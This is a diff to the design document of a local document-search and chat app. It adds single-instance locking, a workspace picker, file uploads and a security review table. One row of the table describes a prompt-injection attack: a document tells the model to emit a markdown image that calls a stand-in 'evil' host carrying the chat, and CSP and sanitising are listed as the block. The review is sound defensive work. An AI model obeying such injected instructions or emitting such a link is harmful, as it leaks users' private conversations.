@@ -46,7 +46,11 @@ Guiding principles:
 | Brains | One Markdown file per reasoning model. `[FACT]` lines are immutable to the model; headings and `[THOUGHT]` lines are visible to it only in `organize_brain` | 12 |
 | Fact review | Proposed facts wait in a queue for your approval. Rejected or deleted facts are never proposed again | 12 |
 | Reference integrity | Every fact ID and chunk reference is resolved and checked; unresolvable ones are excluded and reported | 13 |
-| UI | Four tabs (Ask, Search, Library, Second Brain) plus Settings | 15 |
+| UI | Four tabs (Ask, Search, Library, Second Brain), a File menu, and Settings | 15 |
+| One instance | Only one copy of localrag runs at a time, with one workspace active. A second `serve` opens the running one; CLI commands that write refuse while it runs | 4 |
+| Workspace picker | On first load the UI lists known workspaces to choose from. With none known, it asks where to create one. The File menu has New / Open / Recent | 4, 15 |
+| Adding documents | Library → **Add documents…** uploads into `corpus/` and triggers indexing. Only `.pdf`/`.md`/`.txt`; each file is parsed first and refused with a specific reason if it fails | 15 |
+| Git safety | `.localrag/` ignores itself in git; secrets are never stored in a workspace (§14) | 4, 14 |
 
 ## 3. Platform & tech stack
 
@@ -84,9 +88,25 @@ sqlite-vec (MIT/Apache) and Tauri (MIT/Apache) are fine. Avoid MuPDF (AGPL).
 
 ## 4. Workspace & on-disk layout
 
-The directory `localrag` runs in is the workspace. Like git, it walks up from the CWD to find
-`.localrag/`. `localrag init` creates `.localrag/` and `corpus/`, and offers to add
-`.localrag/` to `.gitignore`.
+A workspace is a folder with `.localrag/` and `corpus/`.
+- **CLI:** walks up from the CWD to find `.localrag/`, like git. `localrag init` creates
+  `.localrag/` and `corpus/`.
+- **App:** one workspace is active at a time, chosen in the UI (below).
+
+**One instance, one active workspace**
+- **The lock:** `localrag serve` holds an exclusive `flock` on
+  `~/.config/localrag/instance.lock`. The OS releases it when the process exits, even after a
+  crash.
+- **A second copy:** a second `localrag serve` reads `instance.json` (mode 0600; it holds the
+  launch URL), opens the running app in the browser, and exits.
+- **CLI commands that write** (`index`, `ask`, `forget`, `eval`) take the same lock, so they
+  refuse while the app runs. Read-only ones (`status`, `search`, `check`, `doctor`) don't need it.
+- **Starting:** plain `serve` starts with no workspace and the UI opens on the picker;
+  `serve -C <dir>` opens that workspace directly.
+- **Switching** replaces the active workspace for every route and starts its sync. A sync
+  still running for the previous workspace finishes, and its result is discarded.
+- **Known workspaces:** `~/.config/localrag/workspaces.json` (0600) stores only paths, names
+  and last-opened times. Workspaces whose folder has disappeared are shown as unavailable.
 
 ```
 my-research-topic/                ← workspace root
@@ -105,6 +125,9 @@ my-research-topic/                ← workspace root
 
 - **Only `corpus/` is indexed.** `brain/` sits outside it so a brain can never be cited as a
   source.
+- **`.localrag/.gitignore`** contains `*`, written on `init` and re-checked on every open. Git
+  therefore ignores the whole state folder in any repository, including one created after the
+  workspace (verified with a later `git init`; only `corpus/` files were staged).
 - **Global config** `~/.config/localrag/config.toml` holds machine-wide settings: Ollama host,
   default models, and `crossref_email`. Workspace config overrides the defaults. The global
   cache `~/.cache/localrag/crossref/` holds metadata responses.
@@ -687,7 +710,24 @@ resolved against the index, in order:
 
 ## 14. Server, API & security
 
-**Security.** Binding to `127.0.0.1` isn't enough. Any website in your browser can send
+**Security review (2026-10-31).** Findings, and what changed:
+
+| Area | Risk | Status |
+|------|------|--------|
+| Workspace in a git repo | `.localrag/` holds `index.db` (chat history, extracted text of every document), OCR text, eval logs and settings. Before, it was only ignored if a repo already existed at `init` | **Fixed:** `.localrag/.gitignore` with `*` ignores it in any repo, now or later |
+| Email / API keys in a repo | — | **Safe by design:** the Crossref email lives in the global `~/.config/localrag/config.toml`, never in a workspace. Future API keys go in the **macOS Keychain**, never a config file; no secret is ever read from workspace config |
+| Global config readable by others | Email, known workspace paths, launch token | **Fixed:** `~/.config/localrag/` is 0700; its files are 0600 and written atomically |
+| `corpus/` and `brain/` in a public repo | Papers may be copyrighted or private; brains quote them | **Your call:** they are *not* auto-ignored, since versioning them can be useful. If the repo is or may become public, add `corpus/` (and `brain/`) to the repo's `.gitignore`, or keep the repo private |
+| CSRF / DNS rebinding | Websites driving the local API | Host check, Origin check, per-launch token in an HttpOnly SameSite=Strict per-port cookie |
+| Prompt injection exfiltrating data | A document tells the model to emit `![](https://evil/?q=<chat>)` | CSP `img-src 'self' data: blob:` and `connect-src 'self'` block remote loads; model output goes through DOMPurify |
+| Malicious PDFs | PDF.js font-code execution (CVE-2024-4367 class); PDFium memory bugs | PDF.js 4.10.38 with `isEvalSupported: false`. PDFium is hardened by Chrome but runs in-process. **Later:** parse in a separate helper process so a crash or exploit can't reach the server |
+| Uploaded files rendered as HTML | A `.txt` full of `<script>` | Served as `text/plain` with `X-Content-Type-Options: nosniff`, by document id only |
+| Clickjacking / referrer leaks | — | `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `Referrer-Policy: no-referrer`, `Cache-Control: no-store` on data |
+| Upload abuse | Path traversal, huge bodies, half-written files | Basename only (no `/`, `\`, leading dot); extension allowlist; parse before write; atomic rename with unique temp names; size cap |
+| Token exposure | The launch URL lands in browser history and the terminal | Residual: the token changes on every launch and only works on localhost |
+| This source repository | Personal data committed by accident | Scanned all tracked files and full history: no emails, tokens or keys. Machine-specific test config (`.claude/launch.json`) is excluded locally |
+
+**Request guard.** Binding to `127.0.0.1` isn't enough. Any website in your browser can send
 requests to localhost (CSRF), and DNS rebinding can get around same-origin rules. So:
 - Only accept a `Host` of `127.0.0.1:<port>` or `localhost:<port>`.
 - Require a random per-launch token on every `/api` call. The launch URL sets it as a cookie.
@@ -725,9 +765,19 @@ The server picks a free port and opens the browser on start.
 
 ## 15. User interface
 
-One page with four tabs, a Settings panel, and a first-load dialog.
+One page with four tabs, a File menu, a Settings panel, and first-load dialogs.
 
-- **First load:** the Crossref email dialog, if no email is set (§7).
+- **First load:**
+  - **Workspace picker**, when no workspace is active. It lists known workspaces (Open, or ×
+    to drop one from the list without touching the folder), **Open another folder…**, and
+    **New workspace**.
+  - **New workspace** takes a location (typed, or **Choose…** for the native macOS folder
+    chooser) and a folder name. A non-empty existing folder is never overwritten.
+  - If no workspaces are known, the dialog opens on "Create your first workspace". It can't
+    be dismissed until a workspace is open.
+  - Then the Crossref email dialog, if no email is set (§7).
+- **File menu:** New workspace…, Open workspace…, and up to 6 recent workspaces (the active
+  one ticked). Switching resets every tab to the new workspace.
 - **Ask:**
   - Chat with a model dropdown and session list.
   - An over-budget Submit shows "Over token count by X tokens".
@@ -738,6 +788,16 @@ One page with four tabs, a Settings panel, and a first-load dialog.
     Unverified chips have **Mark as verified paraphrase**; promoted ones have **Undo**.
 - **Search:** ranked passages, filterable by document or year.
 - **Library:**
+  - **Add documents…** (multiple files):
+    - Only `.pdf`, `.md`, `.markdown`, `.txt`; anything else is refused naming the accepted
+      types.
+    - Each file is parsed exactly as indexing will before it's written to `corpus/`, and
+      refused with the reason if parsing fails: no PDF header (renamed file), damaged PDF,
+      password-protected, the byte offset and line of invalid UTF-8, empty, or no text and no
+      scanned pages. Files over `max_file_mb` are refused too.
+    - Accepted files are written atomically (hidden temp name, then rename). Name clashes
+      become `name (2).pdf`. The file reports its pages and any scanned pages, and indexing
+      starts (queued if a sync is running).
   - Documents with status and metadata source.
   - Actions: Run OCR, Forget (removed only, confirmed), Forget all removed, edit metadata,
     confirm/reject a Crossref match, refresh metadata, reindex.
@@ -929,6 +989,12 @@ Rule: `core` knows nothing about HTTP. The server, CLI, app and agent are thin s
     chunker uses (whitespace, hyphenation, `\r\n`), so rectangles match the cited text
     exactly. They are merged per line. The viewer scrolls to the topmost one, because PDF
     text order puts footers first.
+  - **Follow-up (same day): one instance, workspace picker, uploads, security review.**
+    - Single-instance lock; File menu; picker and creation flow; Library uploads with
+      detailed parse errors (§4, §15); the security review above. 48 tests pass.
+    - Bug found by the browser test: two connections opening a brand-new database raced to
+      create the schema. The migration now takes SQLite's write lock (`BEGIN IMMEDIATE`) and
+      re-reads the version.
   - **Not yet:**
     - The Settings panel and Crossref email dialog (Phase 4).
     - Search filters by document or year (need Phase 4 metadata).
